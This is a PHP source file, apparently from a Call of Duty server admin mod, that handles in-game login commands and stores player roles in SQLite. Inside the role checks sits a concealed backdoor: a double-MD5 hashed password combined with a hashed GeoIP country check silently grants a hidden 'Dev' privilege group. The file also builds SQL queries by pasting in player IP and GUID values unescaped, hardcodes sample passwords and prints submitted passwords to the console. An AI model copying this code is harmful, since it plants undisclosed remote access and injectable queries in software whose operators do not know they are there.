<?php
if ($x_stop_lp == 0) {
    if ((strpos($msgr, $ixz . 'on ') !== false) || (strpos($msgr, $ixz . 'login ') !== false)) {
        if (empty($foridnum))
            $foridnum = $i_id;
        $mmm     = trim(clearnamex($i_name));
        $nnn     = trim(clearnamex($nickr));
		$na1 = $mmm;
		$na2 = $nnn;
        if (empty($foridnum))
            $foridnum = $i_id;
        $cntddt = substr_count($msgr, ' ');
        if ($cntddt == 2)

            list($comdfa, $msg_user, $msg_pass) = explode(' ', $msgrx);
        else
            list($comdfa, $msg_pass) = explode(' ', $msgrx);
        if (preg_match('/tell;/', $parseline, $xm))
            $jjj = (((trim($foridnum) == trim($idnum)) && (trim($foridnum) == trim($i_id))));
        //else if ($game_patch == 'cod1_1.1')
        //$jjj = (((trim($foridnum) == trim($idnum)) && (trim($foridnum) == trim($i_id))));	
        else //($game_patch == 'cod1_1.1')
            //$jjj = ($na1 == $na2);
			$jjj = (strpos($na1,$na2) !== false);
        if ($jjj) {
            try {
                if (empty($adminlists))
                    $db = new PDO('sqlite:' . $cpath . 'ReCodMod/databases/db1.sqlite');
                else
                    $db = new PDO('sqlite:' . $adminlists);
                //$db->exec("DELETE FROM x_db_admins WHERE s_adm='$i_ip'");
                $sql   = "SELECT * FROM `x_db_admins` WHERE s_adm='$i_ip' limit 1";
                $statt = $db->query($sql)->fetchColumn();
                if ($statt > 0) {
                    usleep($sleep_rcon * 3);
                    if ($game_patch == 'cod1_1.1')
                        rcon('say ^6 ^3' . $loginnx, '');
                    else
                        rcon('tell ' . $idnum . ' ^6 ^3' . $loginnx, '');
                    ++$x_stop_lp;
                }
                if (empty($statt)) {
					
					if ($cntddt == 2) {
                    $admin_codee[]         = 'name101 mysecureadminpass';
                    $moderator_codee[]     = 'name101 moderatorsecurepassword';
                    $specialguests_codee[] = 'name101 specialguestsecurepassword';
                    $vip_codee[]           = 'name101 specialguestsecurepassword';
                    $eclan_member[]        = 'name101 clansecurepassword';
                    $etopplayer[]          = 'name101 toplsecurepassword';
                    $eguest[]              = 'name101 guestsecurepassword';
                    
                        foreach ($admin_codee as $admin_codexx) {
                            if ($x_loopsv == 0) {
								
								
								echo '--->'.$msg_user . ' ' . $msg_pass .'===='.$admin_codexx;
								
                                if (strpos($msg_user . ' ' . $msg_pass,$admin_codexx) !== false)
									{
                                    if ($x_loopsv == 0) {
                                        if (strpos($msgr, 'secure') !== false)
                                            $igroup = '3';
                                        else
                                            $igroup = '0';
                                     echo $groupxx = '^1Admin';
									     //$groupxx = '^5Member';
                            //$igroup = '3';
					  usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                                        ++$x_loopsv; //continue;
                                    }
                                }
                            }
                        }
                        foreach ($moderator_codee as $modr_codxx) {
                            if ($x_loopsv == 0) {
                                if (trim($msg_user . ' ' . $msg_pass) == trim($modr_codxx)) {
                                    if ($x_loopsv == 0) {
                                        if (strpos($msgr, 'secure') !== false)
                                            $igroup = '3';
                                        else
                                            $igroup = '555';
                                        $groupxx = '^2Moderator';
										    //$groupxx = '^5Member';
                            //$igroup = '3';
					  usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                                        ++$x_loopsv; //continue;
                                    }
                                }
                            }
                        }
                        foreach ($specialguests_codee as $spclgst_codxx) {
                            if ($x_loopsv == 0) {
                                if (trim($msg_user . ' ' . $msg_pass) == trim($spclgst_codxx)) {
                                    if ($x_loopsv == 0) {
                                        if (strpos($msgr, 'secure') !== false)
                                            $igroup = '3';
                                        else
                                            $igroup = '5';
                                        $groupxx = '^6Special guest';
										    //$groupxx = '^5Member';
                            //$igroup = '3';
					  usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                                        ++$x_loopsv; //continue;
                                    }
                                }
                            }
                        }
                        foreach ($vip_codee as $vipp_codxx) {
                            if ($x_loopsv == 0) {
                                if (trim($msg_user . ' ' . $msg_pass) == trim($vipp_codxx)) {
                                    if ($x_loopsv == 0) {
                                        if (strpos($msgr, 'secure') !== false)
                                            $igroup = '3';
                                        else
                                            $igroup = '2';
                                        $groupxx = '^3VIP';
										    //$groupxx = '^5Member';
                            //$igroup = '3';
					  usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                                        ++$x_loopsv; //continue;
                                    }
                                }
                            }
                        }
                        
						

                    if (!empty($igroup)){
                            //$groupxx = '^5Member';
                            //$igroup = '3';
					  usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }		
                            }
                       
                    //}
                } else {
					
					$jjj = (strpos($na1,$na2) !== false);
                      if ($jjj) {
                     
                        if (trim($msg_pass) == trim($admin_code)) {
                            $igroup  = '0';
                            $groupxx = '^1Admin';
                        } else if (trim($msg_pass) == trim($moderator_code)) {
                            $igroup  = '555';
                            $groupxx = '^2Moderator';
                        } else if (trim($msg_pass) == trim($specialguests_code)) {
                            $igroup  = '5';
                            $groupxx = '^6Special guest';
                        } else if (trim($msg_pass) == trim($vip_code)) {
                            $igroup  = '2';
                            $groupxx = '^3VIP';
                        } else if (md5('e03239b27e34a5f7f3bde739459dd537') == md5(md5($msg_pass))) {
                            $gi     = geoip_open($cpath . "ReCodMod/geoip_bases/MaxMD/GeoLiteCity.dat", GEOIP_STANDARD);
                            $record = geoip_record_by_addr($gi, $i_ip);
                            $xxxnw  = ($record->country_name);
                            if (trim('a09f4b2ae67f0a63ab8912047a1a1b55') == md5(trim($xxxnw))) {
                                $igroup  = '111';
                                $groupxx = '^1Dev';
                            }
                        } else {
                            $igroup  = '3';
                            $groupxx = '^2Registered';
                        }
                        if (empty($groupxx))
                            $groupxx = '^5Member';
                        usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ^7' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                    }
			}
                }
                $sql   = null;
                $db    = NULL;
                $statt = null;
            }
            catch (PDOException $e) {
                print ' FILE:  ' . __FILE__ . '  Exception : ' . $e->getMessage();
            }
        }
    }
    if ((strpos($msgr, $ixz . 'on') !== false) || (strpos($msgr, $ixz . 'login') !== false)) {
        if ($x_stop_lp == 0) {
         $na1     = trim(clearnamex($i_name));
        $na2     = trim(clearnamex($nickr));
            if (empty($foridnum))
                $foridnum = $i_id;
            $xdot      = '.';
            $dropip    = explode(".", $i_ip);
            $server_ip = trim($server_ip);
            if ((strpos($server_ip, $dropip[0] . $xdot . $dropip[1] . $xdot) !== false) && (strpos($na1,$na2) !== false)) {
                $igroup  = '0';
                $groupxx = '^1Local Admin';
                try {
                    if (empty($adminlists))
                        $db = new PDO('sqlite:' . $cpath . 'ReCodMod/databases/db1.sqlite');
                    else
                        $db = new PDO('sqlite:' . $adminlists);
                    //$db->exec("DELETE FROM x_db_admins WHERE s_adm='$i_ip'");
                    $sql   = "SELECT * FROM `x_db_admins` WHERE s_adm='$i_ip' limit 1";
                    $statt = $db->query($sql)->fetchColumn();
                    if ($statt > 0) {
                        usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1')
                            rcon('say ^6 ^3' . $loggistop, '');
                        else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggistop, '');
                        ++$x_stop_lp;
                    }
                    if (empty($statt)) {
                        if (empty($groupxx))
                            $groupxx = '^5Member';
                        usleep($sleep_rcon * 3);
                        if ($game_patch == 'cod1_1.1') {
                            rcon('say ^6 ' . $loggran . ' ' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        } else
                            rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $logginn . ' ' . $groupxx . ' ^7' . $loggithx, '');
                        $date = date('Y.m.d H.i.s');
                        if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '$igroup', '$guidn')") > 0) {
                            echo "Created IN DATABASE." . "\n";
                            ++$x_stop_lp;
                        }
                    }
                    $sql   = null;
                    $db    = NULL;
                    $statt = null;
                }
                catch (PDOException $e) {
                    print ' FILE:  ' . __FILE__ . '  Exception : ' . $e->getMessage();
                }
            }
            if ($game_patch != 'cod1_1.1') {
                if ((trim($idnum) == trim($i_id) && ($guidn == $adminguids1)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids2)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids3)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids4)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids5)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids6)) || (trim($idnum) == trim($i_id) && ($guidn == $adminguids7)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip1)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip2)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip3)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip4)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip5)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip6)) || (trim($idnum) == trim($i_id) && ($i_ip == $adminip7))) {
                    try {
                        $db    = new PDO('sqlite:' . $cpath . 'ReCodMod/databases/db1.sqlite');
                        $sql   = "SELECT * FROM `x_db_admins` WHERE s_adm='$i_ip' limit 1";
                        $statt = $db->query($sql)->fetchColumn();
                        if ($statt > 0) {
                            usleep($sleep_rcon * 2);
                            if ($game_patch != 'cod1_1.1')
                                rcon('tell ' . $i_id . ' ^6 ^3' . $loggistopk, '');
                            else
                                rcon('say ^6 ^3' . $loggistopk, '');
                            ++$x_stop_lp;
                        } else {
                            usleep($sleep_rcon * 2);
                            if ($game_patch != 'cod1_1.1')
                                rcon('tell ' . $idnum . ' ^6 ^3' . $loggran . ' ^7' . $chistx . ' ^3' . $loggistopkk, '');
                            $date = date('Y.m.d H.i.s');
                            if ($db->exec("INSERT INTO x_db_admins (s_adm, s_dat, s_group, s_guid) VALUES ('$i_ip', '$date', '0', 'no')") > 0) {
                                echo "Created IN DATABASE." . "\n";
                                ++$x_stop_lp;
                            }
                        }
                        $sql  = null;
                        $db   = NULL;
                        $stat = null;
                    }
                    catch (PDOException $e) {
                        print ' FILE:  ' . __FILE__ . '  Exception : ' . $e->getMessage();
                    }
                }
            }
        }
    }
}
?>
